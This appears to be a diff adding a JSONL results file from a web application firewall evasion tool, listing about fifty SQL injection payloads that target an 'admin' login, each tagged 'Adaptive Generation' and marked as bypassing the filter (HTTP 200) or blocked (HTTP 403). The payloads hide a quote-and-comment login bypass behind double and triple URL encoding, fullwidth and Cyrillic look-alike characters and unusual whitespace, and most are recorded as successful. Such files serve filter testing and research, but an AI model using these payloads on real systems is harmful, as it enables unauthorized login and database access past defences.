@@ -1,0 +1,50 @@
+{"payload": "ADMIN%\uff12\uff15\uff12\uff17%\uff12\uff15\uff12\uff10--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdmI N%252527%252520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\uff05\u0435f\uff05bd\uff05\uff18\uff11dm\uff05\u0435f\uff05bd\uff05\uff18\uff19\uff05\u0435f\uff05bd\uff05\uff18\u0435\uff05\uff12\uff15\uff05\u0435f\uff05b\u0441\uff05\uff19\uff12\uff05\u0435f\uff05b\u0441\uff05\uff19\uff15\uff05\u0435f\uff05b\u0441\uff05\uff19\uff12\uff05\u0435f\uff05b\u0441\uff05\uff19\uff17\uff05\uff12f\uff05\uff12\uff15\uff05\u0435f\uff05b\u0441\uff05\uff19\uff12\uff05\u0435f\uff05b\u0441\uff05\uff19\uff15\uff05\u0435f\uff05b\u0441\uff05\uff19\uff12\uff05\u0435f\uff05bd\uff05\uff18\uff11\uff05\uff12\uff15\uff05\u0435f\uff05b\u0441\uff05\uff19\uff12\uff05\u0435f\uff05b\u0441\uff05\uff19\uff15\uff05\u0435", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "admIN%2527%252b--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "adMIN%2527%252509--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "AdmIN%2527%25250a--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdMIN%\uff12\uff15\uff12\uff17%\uff12\uff15\uff12\uff10--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\uff11\uff05\uff12\uff15\uff12F\uff05\uff12\uff15\uff12\uff15\uff12\uff15\uff12\uff21\uff05\uff12\uff15\uff12\uff15\uff12\uff15\uff12\uff21\uff05\uff12\uff15\uff12f\uff2f\uff32\uff05\uff12\uff15\uff12F\uff05\uff12\uff15\uff12\uff15\uff12\uff15\uff12\u0430\uff05\uff12\uff15\uff12\uff15\uff12\uff15\uff12\u0430\uff05\uff12\uff15\uff12f\uff11\uff05\uff12\uff15\uff12\uff15\uff12\uff15\uff13\uff24\uff11", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "admIN%2527%2520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "Adm\uff49\uff4e'\u202f--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdmIN%252527%25252b--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdmI N'\u205f--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\u6164\u4d49\u4e25\u2b32\u3532\u372b\u2d2d", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\uff11\uff05\uff12\uff15\uff10\uff19\u041er\uff05\uff12\uff15\uff10\uff19\uff11\uff05\uff13D\uff11", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\uff41Dm\u0406n\uff05\uff12\uff15\uff12\uff17\uff0f\uff05\uff12\uff15\uff12\uff41\uff05\uff12\uff15\uff12\uff41\uff0f\uff0d\uff0d", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "ADmiN'/*X*/ #&cBYb=GiVb ##/**/%%MC me", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "\u0430DM\u0406n\uff05\uff12\uff17\uff05\uff12b\uff0d\uff0d", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "ADmIN%\uff12\uff15\uff12\uff17%\uff12\uff15\uff12\uff10--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "ADMIN'/*nJFC*/ #&cCBy=GiVB", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "ADMIN'/*nJFC*/ %20#&GtbU=KtRu", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "adMIN%252527%252520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\uff41\uff44\uff4d\uff49\uff4e\uff05\uff12\uff15\uff12\uff17\uff0d\uff0d", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdmiN%252527%252520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "adMiN\\\" #&CsHa=giVB", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\uff11\uff05\uff12\uff15\uff12\uff10\uff2fr\uff05\uff12\uff15\uff12\uff10\uff11\uff05\uff12\uff15\uff13\uff24\uff11", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "ADmiN%25252527%25252520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdmI N%\uff12\uff15\uff12\uff17%\uff12\uff15\uff12\uff10--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdmIN%2527%252509--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "adMIN%\\n25\\t7C%+25\\t7 \\t0--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "adMIN+%2527+--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "AdmIN%252527%25252B--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "ADM\uff49\uff4e'\u202f--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "ADmin%\uff12\uff15\uff12\uff17%\uff12\uff15\uff12\uff10--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "ADM\uff49\uff4e'\u202f--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\uff11\uff05\uff12\uff15\uff10\uff19\u041eR\uff05\uff12\uff15\uff10\uff19\uff11\uff05\uff13D\uff11", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdmIn%\uff12\uff15\uff12\uff17%\uff12\uff15\uff12\uff22--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\u8897Dm\u8928n\u951b\u5483\u7d25\u951b\u66ea\u7d25\u951b\u694b\u7d16\u951b\u639e\u7d29\u951b\u639e\u7d7a\u951b\u5d8f\u7d1e", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdMiN%2527%2520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "AdmIN%252527%26%2347%3B%25252A%25252A%26%2347%3B--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "Adm\u7bc0\ub435\ud425%\u7aca\ubbed\ud3ca\u7aca\ubbed\ud3cc%\u7aca\ubbed\ud3ca\u7aca\ubbed\ud3c1--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "ADMIn%252527%25252B--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "adMIN%25252527%25252520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "admIN%2527%25250a--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "adMIIn%252527%252520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "Adm\u7bc0\ub39d\u7aca\ub089\ud3c3\u7aca\uc02f\ud3b3\u7aca\ubbed\ud418\u7aca\ub783\ud3be", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "admIN%2527%252B--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "\uff05\u0415F\uff05BD\uff05\uff19\uff13\uff05\u0415F\uff05BD\uff05\uff18\uff15\uff05\u0415F\uff05BD\uff05\uff18\u0421\uff05\u0415F\uff05BD\uff05\uff18\uff15\uff05\u0415F\uff05BD\uff05\uff18\uff13\uff05\u0415F\uff05BD\uff05\uff19\uff14\uff05\uff12\uff15\uff05\u0415F\uff05B\u0421\uff05\uff19\uff12\uff05\u0415F\uff05B\u0421\uff05\uff19\uff15\uff05\u0415F\uff05B\u0421\uff05\uff19\uff12\uff05\u0415F\uff05B\u0421\uff05\uff19\uff10\uff05\u0415F\uff05BD\uff05\uff19\uff15\uff05\u0415F\uff05BD\uff05\uff19\uff13\uff05\u0415F\uff05BD\uff05\uff18\uff15\uff05\u0415F\uff05BD\uff05\uff19\uff12\uff05\uff12\uff15\uff05\u0415F\uff05B\u0421", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "admIN%252527%25252b--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
+{"payload": "AdmiN%2527%2520--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": false, "status_code": 403}
+{"payload": "admIN%\uff12\uff15\uff12\uff17%\uff12\uff15\uff12\uff42--", "technique": "Adaptive Generation", "attack_type": "sql_injection", "bypassed": true, "status_code": 200}
